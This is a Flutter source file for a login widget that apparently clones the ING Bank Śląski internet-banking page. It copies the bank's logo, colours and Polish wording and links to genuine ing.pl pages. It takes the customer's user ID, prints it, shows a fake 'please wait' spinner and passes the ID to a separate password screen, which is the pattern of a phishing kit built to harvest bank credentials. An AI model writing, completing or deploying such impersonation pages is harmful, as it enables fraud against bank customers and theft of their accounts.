import 'package:email_validator/email_validator.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';

import '../../circularprogressive.dart';
import '../../layout/layout.dart';
import '../../layout/password_layout.dart';
import 'container_widget.dart';
import 'homepage.dart';

class SubContainer extends StatelessWidget {
  const SubContainer({
    Key? key,
    required this.formKey,
    required this.loginController,
    required this.urk,
    required this.url,
  }) : super(key: key);

  final GlobalKey<FormState> formKey;
  final TextEditingController loginController;
  final Uri urk;
  final Uri url;
  final double size = 100;
  @override
  Widget build(BuildContext context) {
    final Uri lock = Uri.parse(
        'https://www.ing.pl/indywidualni/bankowosc-internetowa/bezpieczenstwo');
    final Uri keyi =
        Uri.parse('https://www.ing.pl/indywidualni/odnosniki/aktywacja');
    final Uri urk = Uri.parse(
        'https://www.ing.pl/indywidualni/bankowosc-internetowa/centrum-pomocy');
    final Uri url = Uri.parse(
        'https://www.ing.pl/aktualnosci/bankowosc-elektroniczna?news_id=1105917-oszusci-wysylaja-mejle-podszywajace-sie-pod-bank?src=login');
    return Container(
      //height: 500,
      decoration: BoxDecoration(
        color: Layout.isMobile(context)
            ? CupertinoColors.white.withOpacity(0.2)
            : CupertinoColors.white.withOpacity(1),
        borderRadius: const BorderRadius.only(
            topRight: Radius.circular(5),
            topLeft: Radius.circular(5),
            bottomLeft: Radius.circular(5),
            bottomRight: Radius.circular(5)),
      ),
      child: Padding(
        padding: const EdgeInsets.only(left: 40.0, right: 40),
        child: SingleChildScrollView(
          physics: const BouncingScrollPhysics(),
          child: Column(
            children: [
              Padding(
                padding: const EdgeInsets.only(top: 20.0, left: 10, right: 10),
                child: Layout.isMobile(context)
                    ? null
                    : const Image(
                        width: 120,
                        filterQuality: FilterQuality.high,
                        fit: BoxFit.contain,
                        height: 35,
                        image: AssetImage('images/ing.png')),
              ),
              const SizedBox(height: 20),
              Padding(
                padding: Layout.isMobile(context)
                    ? const EdgeInsets.only(left: 0.0, right: 0.0)
                    : const EdgeInsets.only(left: 80.0, right: 80.0),
                child: Wrap(
                  children: [
                    Text(
                      'Zaloguj się do bankowości internetowej',
                      style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: Layout.isMobile(context) ? 16 : 14,
                          letterSpacing: Layout.isMobile(context) ? 1 : 0,
                          wordSpacing: Layout.isMobile(context) ? 2 : 1),
                    ),
                    const SizedBox(height: 30),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.start,
                      children: const [
                        Text(
                          'Login',
                          style: TextStyle(
                              fontSize: 16, letterSpacing: 1, wordSpacing: 1),
                        ),
                        SizedBox(width: 5),
                        Icon(
                          Icons.question_mark_outlined,
                          color: Colors.red,
                          size: 15,
                        )
                      ],
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 10),
              Padding(
                padding: Layout.isMobile(context)
                    ? const EdgeInsets.only(left: 0.0, right: 0.0)
                    : const EdgeInsets.only(left: 80.0, right: 80.0),
                child: Form(
                  autovalidateMode: AutovalidateMode.disabled,
                  key: formKey,
                  child: Padding(
                    padding: const EdgeInsets.only(bottom: 15),
                    child: Column(
                      children: [
                        TextFormField(
                          maxLines: 1,
                          focusNode: FocusNode(),
                          autovalidateMode: AutovalidateMode.disabled,
                          enableIMEPersonalizedLearning: true,
                          selectionControls: CupertinoTextSelectionControls(),
                          textCapitalization: TextCapitalization.none,
                          enableInteractiveSelection: true,
                          autofillHints: const [AutofillHints.email],
                          enableSuggestions: true,
                          autocorrect: true,
                          showCursor: true,
                          autofocus: false,
                          textAlign: TextAlign.start,
                          strutStyle: const StrutStyle(),
                          style: const TextStyle(),
                          textInputAction: TextInputAction.done,
                          keyboardType: TextInputType.emailAddress,
                          controller: loginController,
                          validator: (ifemail) =>
                              !EmailValidator.validate(ifemail!)
                                  ? 'Enter a valid User ID'
                                  : null,
                          decoration: InputDecoration(
                              focusedBorder: myfocusborder(),
                              focusColor: Colors.red,
                              fillColor: CupertinoColors.white,
                              filled: true,
                              contentPadding: const EdgeInsets.only(
                                left: 10,
                                right: 10,
                              ),
                              border: const OutlineInputBorder(
                                  borderRadius:
                                      BorderRadius.all(Radius.circular(5)))),
                        ),
                        const SizedBox(
                          height: 20,
                        ),
                        ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            elevation: 0,
                            backgroundColor: const Color(0xFFff6200),
                            shape: BeveledRectangleBorder(
                                borderRadius: BorderRadius.circular(10),
                                side: BorderSide(
                                    color: Layout.isMobile(context)
                                        ? CupertinoColors.white
                                        : CupertinoColors.lightBackgroundGray,
                                    width: 2)),
                            minimumSize: const Size.fromHeight(45),
                            fixedSize: const Size(150, 45),
                          ),
                          onPressed: () {
                            

                            if (formKey.currentState!.validate()) {
                              showDialog(
                                  context: context,
                                  builder: (context) {
                                    return Center(
                                        child: Column(
                                      mainAxisAlignment:
                                          MainAxisAlignment.center,
                                      mainAxisSize: MainAxisSize.max,
                                      children: [
                                        TweenAnimationBuilder(
                                          builder: (BuildContext context, value,
                                              Widget? child) {
                                            int percentage =
                                                (value * 100).ceil();
                                            return CircularProgressIndicater(
                                              child: Stack(
                                                children: [
                                                  ShaderMask(
                                                    shaderCallback: (rect) {
                                                      return SweepGradient(
                                                          stops: [value, value],
                                                          startAngle: 0.0,
                                                          endAngle: 3.14 * 2,
                                                          center:
                                                              Alignment.center,
                                                          colors: [
                                                            Colors.red,
                                                            Colors.grey
                                                                .withAlpha(55)
                                                          ]).createShader(rect);
                                                    },
                                                    child: Center(
                                                      child: Container(
                                                        width: size,
                                                        height: size,
                                                        decoration: const BoxDecoration(
                                                            shape:
                                                                BoxShape.circle,
                                                            color: Colors.yellow
                                                           
                                                            ),
                                                      ),
                                                    ),
                                                  ),
                                                  Center(
                                                    child: Container(
                                                      width: size - 0.2 * size,
                                                      height: size - 0.2 * size,
                                                      decoration:
                                                          const BoxDecoration(
                                                              color:
                                                                  Colors.white,
                                                              shape: BoxShape
                                                                  .circle),
                                                      child: Center(
                                                          child: Text(
                                                        '$percentage',
                                                        style: const TextStyle(
                                                            color:
                                                                Colors.orange,
                                                            fontSize: 20),
                                                      )),
                                                    ),
                                                  )
                                                ],
                                              ),
                                            );
                                          },
                                          tween: Tween(begin: 0.0, end: 1.0),
                                          duration: const Duration(seconds: 3),
                                        ),
                                        const SizedBox(height: 30),
                                        const Card(
                                          shape: RoundedRectangleBorder(
                                              borderRadius: BorderRadius.all(
                                                  Radius.circular(7))),
                                          color: Colors.grey,
                                          child: Padding(
                                            padding: EdgeInsets.all(8.0),
                                            child: Text('proszę czekać...',
                                                style: TextStyle(
                                                    fontSize: 13,
                                                    letterSpacing: 1.2,
                                                    color:
                                                        CupertinoColors.white)),
                                          ),
                                        ),
                                      ],
                                    ));
                                  });
                              // Timer(const Duration(seconds: 3),
                              //     () => {launchUrl(url), Navigator.pop(context)});
                              Future.delayed(const Duration(seconds: 3), () {
                                Navigator.of(context).push(MaterialPageRoute(
                                    builder: (context) => PasswordLayout(
                                          email: loginController.text,
                                        )));
                              });

                              debugPrint('User ID:${loginController.text}');
                            }
                          },
                          child: const Text('Dalej',
                              style: TextStyle(
                                color: Colors.white,
                                letterSpacing: 1.2,
                                fontWeight: FontWeight.bold,
                                fontSize: 16,
                              )),
                        ),
                        const SizedBox(
                          height: 15,
                        ),
                        Align(
                          alignment: Alignment.bottomRight,
                          child: TextButton(
                            onPressed: () {
                              launchUrl(urk);
                            },
                            child: const Text('Problemy z logowaniem',
                                style: TextStyle(
                                  color: Color(0xFFff6200),
                                  letterSpacing: 1.2,
                                  fontWeight: FontWeight.normal,
                                  fontSize: 14,
                                )),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(
                height: 15,
              ),
              const Divider(
                thickness: 0.5,
                color: Color.fromARGB(255, 29, 29, 29),
                indent: 2,
                endIndent: 2,
              ),
              const SizedBox(
                height: 20,
              ),
              Align(
                alignment: Alignment.bottomLeft,
                child: TextButton(
                  onPressed: () {
                    launchUrl(url);
                  },
                  child: const Text('Poznaj zasady bezpieczeństwa',
                      style: TextStyle(
                        color: Color(0xFFff6200),
                        letterSpacing: 1.2,
                        fontWeight: FontWeight.normal,
                        fontSize: 12,
                      )),
                ),
              ),
              const SizedBox(
                height: 15,
              ),
              Align(
                alignment: Alignment.bottomLeft,
                child: Padding(
                  padding: Layout.isMobile(context)
                      ? const EdgeInsets.only(bottom: 30.0)
                      : const EdgeInsets.only(bottom: 10.0),
                  child: const Text('ING BANK SLASKI STRONA LOGOWANIA',
                      style: TextStyle(
                        color: Color(0xFFff6200),
                        letterSpacing: 1.2,
                        fontWeight: FontWeight.bold,
                        fontSize: 14,
                      )),
                ),
              ),
              Layout.isMobile(context)
                  ? IsmibilecontainerWidget(keyi: keyi, lock: lock)
                  : const SizedBox(),
              const SizedBox(
                height: 30,
              ),
              Align(
                  alignment: Alignment.topLeft,
                  child: Layout.isMobile(context)
                      ? const Text('Infolinia : 3235700769',
                          style: TextStyle(fontSize: 12))
                      : const SizedBox()),
              const SizedBox(
                height: 10,
              ),
              Align(
                  alignment: Alignment.topLeft,
                  child: Layout.isMobile(context)
                      ? const Text(
                          'Polityka cookies',
                          style: TextStyle(fontSize: 12),
                        )
                      : const SizedBox()),
              const SizedBox(
                height: 30,
              )
            ],
          ),
        ),
      ),
    );
  }
}
